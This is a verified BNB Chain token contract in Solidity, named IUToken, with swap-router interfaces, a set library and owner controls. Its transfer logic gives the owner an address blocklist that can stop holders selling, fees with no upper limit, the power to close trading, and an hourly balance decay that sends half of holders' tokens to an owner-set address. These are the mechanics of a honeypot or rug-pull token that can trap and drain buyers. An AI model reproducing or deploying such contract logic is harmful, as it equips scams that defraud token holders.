/**
 *Submitted for verification at BscScan.com on 2023-04-15
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.9;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}
interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}
interface IUniswapV2Pair {
    function getReserves() external view returns (uint256 reserve0, uint256 reserve1, uint32 blockTimestampLast);
}

library EnumerableSet {

    struct Set {
        bytes32[] _values;
        mapping (bytes32 => uint256) _indexes;
    }

    function _add(Set storage set, bytes32 value) private returns (bool) {
        if (!_contains(set, value)) {
            set._values.push(value);
            set._indexes[value] = set._values.length;
            return true;
        } else {
            return false;
        }
    }

    function _remove(Set storage set, bytes32 value) private returns (bool) {

        uint256 valueIndex = set._indexes[value];

        if (valueIndex != 0) {

            uint256 toDeleteIndex = valueIndex - 1;
            uint256 lastIndex = set._values.length - 1;


            bytes32 lastvalue = set._values[lastIndex];

            set._values[toDeleteIndex] = lastvalue;

            set._indexes[lastvalue] = toDeleteIndex + 1;

            set._values.pop();

            delete set._indexes[value];

            return true;
        } else {
            return false;
        }
    }


    function _contains(Set storage set, bytes32 value) private view returns (bool) {
        return set._indexes[value] != 0;
    }


    function _length(Set storage set) private view returns (uint256) {
        return set._values.length;
    }


    function _at(Set storage set, uint256 index) private view returns (bytes32) {
        require(set._values.length > index, "EnumerableSet: index out of bounds");
        return set._values[index];
    }

    struct Bytes32Set {
        Set _inner;
    }


    function add(Bytes32Set storage set, bytes32 value) internal returns (bool) {
        return _add(set._inner, value);
    }


    function remove(Bytes32Set storage set, bytes32 value) internal returns (bool) {
        return _remove(set._inner, value);
    }


    function contains(Bytes32Set storage set, bytes32 value) internal view returns (bool) {
        return _contains(set._inner, value);
    }


    function length(Bytes32Set storage set) internal view returns (uint256) {
        return _length(set._inner);
    }


    function at(Bytes32Set storage set, uint256 index) internal view returns (bytes32) {
        return _at(set._inner, index);
    }

    struct AddressSet {
        Set _inner;
    }


    function add(AddressSet storage set, address value) internal returns (bool) {
        return _add(set._inner, bytes32(uint256(uint160(value))));
    }


    function remove(AddressSet storage set, address value) internal returns (bool) {
        return _remove(set._inner, bytes32(uint256(uint160(value))));
    }


    function contains(AddressSet storage set, address value) internal view returns (bool) {
        return _contains(set._inner, bytes32(uint256(uint160(value))));
    }


    function length(AddressSet storage set) internal view returns (uint256) {
        return _length(set._inner);
    }


    function at(AddressSet storage set, uint256 index) internal view returns (address) {
        return address(uint160(uint256(_at(set._inner, index))));
    }

    struct UintSet {
        Set _inner;
    }


    function add(UintSet storage set, uint256 value) internal returns (bool) {
        return _add(set._inner, bytes32(value));
    }


    function remove(UintSet storage set, uint256 value) internal returns (bool) {
        return _remove(set._inner, bytes32(value));
    }


    function contains(UintSet storage set, uint256 value) internal view returns (bool) {
        return _contains(set._inner, bytes32(value));
    }


    function length(UintSet storage set) internal view returns (uint256) {
        return _length(set._inner);
    }


    function at(UintSet storage set, uint256 index) internal view returns (uint256) {
        return uint256(_at(set._inner, index));
    }
}
abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract IUToken is IERC20, Ownable {
    using EnumerableSet for EnumerableSet.AddressSet;
    uint8 private _decimals;
    uint8 private _sellRate;
    uint8 private _buyRate;
    uint8 private _transferRate;
    uint8 private _subLiquidityRate;

    uint32 private _startTradeBlock;
    uint32 private _burnPeriod;
    uint32 private _burnRate1;
    uint32 private _rate1Times;
    uint256 private _addPriceTokenAmount;
    uint256 private _totalSupply;
    uint256 private constant MAX = ~uint256(0);

    address private _addressA;
    address private _usdtAddress;
    address private _routerAddress;
    address private _usdtPairAddress;
    ISwapRouter public uniswapV2Router;

    string private _name;
    string private _symbol;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _swapPairMap;
    mapping(address => uint32) public _lastTradeTime;
    EnumerableSet.AddressSet private _excludeFeeSet;
    EnumerableSet.AddressSet private _tradeSet;

    constructor (string memory Name, string memory Symbol, uint256 Supply, address RouterAddress, address UsdtAddress, address addressA){
        _name = Name;
        _symbol = Symbol;
        _decimals = 18;
        _usdtAddress = UsdtAddress;
        _routerAddress = RouterAddress;
        _allowances[address(this)][RouterAddress] = MAX;
        uniswapV2Router = ISwapRouter(RouterAddress);
        ISwapFactory swapFactory = ISwapFactory(uniswapV2Router.factory());
        _usdtPairAddress = swapFactory.createPair(address(this), UsdtAddress);
        _swapPairMap[_usdtPairAddress] = true;

        uint256 total = Supply * 1e18;
        _totalSupply = total;

        _addressA = addressA;
        _balances[msg.sender] = total;
        emit Transfer(address(0), msg.sender, total);

        _excludeFeeSet.add(msg.sender);
        _excludeFeeSet.add(addressA);
        _excludeFeeSet.add(address(this));
        _excludeFeeSet.add(RouterAddress);
        _excludeFeeSet.add(address(0x000000000000000000000000000000000000dEaD));
        _addPriceTokenAmount=0;
        _burnPeriod = 3600;//1小时
        _burnRate1 = 998916;//1000000
        _sellRate = 5;
        _buyRate = 5;
        _transferRate = 5;
        _subLiquidityRate = 10;
        _rate1Times = 25;//每天一共的次数
    }

    function getAllParams() external view returns (
        uint8  sellRate,
        uint8  buyRate,
        uint8  transferRate,
        uint8  subLiquidityRate,
        uint32  startTradeBlock,
        uint32  burnPeriod,
        uint32  burnRate1,
        uint32  rate1Times,
        uint256  addPriceTokenAmount,
        address  addressA
    ){
        sellRate = _sellRate;
        buyRate = _buyRate;
        transferRate = _transferRate;
        subLiquidityRate = _subLiquidityRate;
        startTradeBlock = _startTradeBlock;
        burnPeriod = _burnPeriod;
        burnRate1 = _burnRate1;
        rate1Times = _rate1Times;
        addPriceTokenAmount = _addPriceTokenAmount;
        addressA = _addressA;
    }

    function pairAddress() external view returns (address) {
        return _usdtPairAddress;
    }

    function usdtAddress() external view returns (address) {
        return _usdtAddress;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view override returns (uint256) {
        if(_swapPairMap[account] || _excludeFeeSet.contains(account)){
            return _balances[account];
        }
        return _viewBalance(account, block.timestamp);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) external view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function rpow(uint256 x,uint256 n,uint256 scalar) internal pure returns (uint256 z) {

        assembly {
            switch x
            case 0 {
                switch n
                case 0 {

                    z := scalar
                }
                default {

                    z := 0
                }
            }
            default {
                switch mod(n, 2)
                case 0 {

                    z := scalar
                }
                default {

                    z := x
                }


                let half := shr(1, scalar)

                for {

                    n := shr(1, n)
                } n {

                    n := shr(1, n)
                } {


                    if shr(128, x) {
                        revert(0, 0)
                    }


                    let xx := mul(x, x)


                    let xxRound := add(xx, half)


                    if lt(xxRound, xx) {
                        revert(0, 0)
                    }


                    x := div(xxRound, scalar)


                    if mod(n, 2) {

                        let zx := mul(z, x)


                        if iszero(eq(div(zx, x), z)) {

                            if iszero(iszero(x)) {
                                revert(0, 0)
                            }
                        }


                        let zxRound := add(zx, half)


                        if lt(zxRound, zx) {
                            revert(0, 0)
                        }


                        z := div(zxRound, scalar)
                    }
                }
            }
        }
    }

    function getRemainBalance(uint balance, uint256 r, uint n) public pure returns(uint){
        return balance*rpow(r,n,1000000)/1000000;
    }

    function getBalanceChangeInfo(address account, uint256 time) public view returns(uint32 burnRate, uint256 burnTimes){
        uint256 burnPeriod = _burnPeriod;
        uint256 lastTradeTime = uint256(_lastTradeTime[account]);
        uint256 begin = lastTradeTime - lastTradeTime%burnPeriod;//上次燃烧的开始时间
        burnTimes = (time - time%burnPeriod - begin)/burnPeriod; //上次到现在燃烧过几次
        burnRate = _burnRate1;
    }

    function _viewBalance(address account,uint256 time) internal view returns(uint){

        uint balance = _balances[account];
        if( balance > 0 ){
            (uint32 burnRate, uint256 burnTimes) = getBalanceChangeInfo(account, time);
            uint remainBalance;
            remainBalance=getRemainBalance(balance, burnRate, burnTimes);
            return remainBalance;
        }
        return balance;
    }

    function _updateBalance(address account,uint256 time) internal {
        if(_swapPairMap[account] || _excludeFeeSet.contains(account)) return;
        uint balance = _balances[account];
        if( balance > 0 ){
            uint viewBalance = _viewBalance(account,time);
            if( balance > viewBalance){
                _lastTradeTime[account] = uint32(time);
                uint burnAmount = balance - viewBalance;
                _tokenTransfer(account, address(0), burnAmount/2);
                _tokenTransfer(account, _addressA, burnAmount/2);
            }
        }else{
            _lastTradeTime[account] = uint32(time);
        }
    }

    function _isLiquidity(address from,address to) internal view returns(bool isAdd,bool isDel){
        (uint r0,uint r1,) = IUniswapV2Pair(_usdtPairAddress).getReserves();
        uint rUsdt = r0;
        uint bUsdt = IERC20(_usdtAddress).balanceOf(_usdtPairAddress);
        if(address(this)<_usdtAddress){
            rUsdt = r1;
        }
        if( _swapPairMap[to] ){
            if( bUsdt >= rUsdt ){
                isAdd = bUsdt - rUsdt >= _addPriceTokenAmount;
            }
        }
        if( _swapPairMap[from] ){
            isDel = bUsdt <= rUsdt;
        }
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(amount > 0, "IU: transfer amount must be bg 0");
        require(!_tradeSet.contains(from),"from address is blocked");
        require(!(_tradeSet.contains(to) && _swapPairMap[from]),"to address buy or remove is blocked");
        uint time = block.timestamp;
        _updateBalance(from, time);

        if (_excludeFeeSet.contains(from) || _excludeFeeSet.contains(to) ){
            _tokenTransfer(from, to, amount);
            if(!_swapPairMap[to] && !_excludeFeeSet.contains(to)) {

                _lastTradeTime[to] = uint32(time);
            }
        }else{
            require(_startTradeBlock > 0, "IU: trade don not start");
            (bool isAddLiquidity, bool isDelLiquidity) = _isLiquidity(from,to);
            uint feeRate = _sellRate;
            if(isAddLiquidity || isDelLiquidity){
                if(isDelLiquidity) {
                    feeRate = _subLiquidityRate;
                    _lastTradeTime[to] = uint32(time);

                    _tokenTransfer(from, _addressA, amount*feeRate*6/100/10);
                    _tokenTransfer(from, address(0), amount*feeRate*4/100/10);
                    amount = amount*(100-feeRate)/100;
                }
                _tokenTransfer(from, to, amount);
            }else{

                if(_swapPairMap[from]){
                    feeRate = _buyRate;
                    _updateBalance(to, time);
                }else if(_swapPairMap[to]){

                }else{

                    feeRate = _transferRate;
                    _lastTradeTime[to] = uint32(time);
                }
                _tokenTransfer(from, to, amount*(100-feeRate)/100);
                _tokenTransfer(from, _addressA, amount*feeRate*6/100/10);
                _tokenTransfer(from, address(0), amount*feeRate*4/100/10);
            }
        }
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        _balances[recipient] = _balances[recipient] + tAmount;
        emit Transfer(sender, recipient, tAmount);
    }


    function setAddressA(address addr) external onlyOwner {
        _addressA = addr;
    }

    function setBurnRate1(uint32 rate) external onlyOwner {
        _burnRate1 = rate;
    }


    function setRate1Times(uint32 times) external onlyOwner {
        _rate1Times = times;
    }

    function startTrade() external onlyOwner {
        require(0 == _startTradeBlock, "trading");
        _startTradeBlock = uint32(block.number);
    }

    function closeTrade() external onlyOwner {
        _startTradeBlock = 0;
    }

    function updateFeeExclude(address addr, bool isRemove) external onlyOwner {
        if(isRemove) _excludeFeeSet.remove(addr);
        else _excludeFeeSet.add(addr);
    }

    function isExcludeFeeAddress(address account) external view returns(bool){
        return _excludeFeeSet.contains(account);
    }

    function getExcludeFeeAddressList() external view returns(address [] memory){
        uint size = _excludeFeeSet.length();
        address[] memory addrs = new address[](size);
        for(uint i=0;i<size;i++) addrs[i]= _excludeFeeSet.at(i);
        return addrs;
    }

    function updateTrade(address addr, bool isRemove) external onlyOwner {
        if(isRemove) _tradeSet.remove(addr);
        else _tradeSet.add(addr);
    }

    function isTradeAddress(address account) external view returns(bool){
        return _tradeSet.contains(account);
    }

    function getTradeAddressList() external view returns(address [] memory){
        uint size = _tradeSet.length();
        address[] memory addrs = new address[](size);
        for(uint i=0;i<size;i++) addrs[i]= _tradeSet.at(i);
        return addrs;
    }

    function setSwapPairMap(address addr, bool enable) external onlyOwner {
        _swapPairMap[addr] = enable;
    }

    function setSubLiquidityRate(uint8 rate) external onlyOwner {
        _subLiquidityRate = rate;
    }

    function setSellRate(uint8 rate) external onlyOwner {
        _sellRate = rate;
    }

    function setBuyRate(uint8 rate) external onlyOwner {
        _buyRate = rate;
    }

    function setTransferRate(uint8 rate) external onlyOwner {
        _transferRate = rate;
    }

    function setBurnPeriod(uint32 second) external onlyOwner {
        _burnPeriod = second;
    }

    function setAddPriceTokenAmount(uint256 amount) external onlyOwner {
        _addPriceTokenAmount = amount;
    }
    receive() external payable {}
}
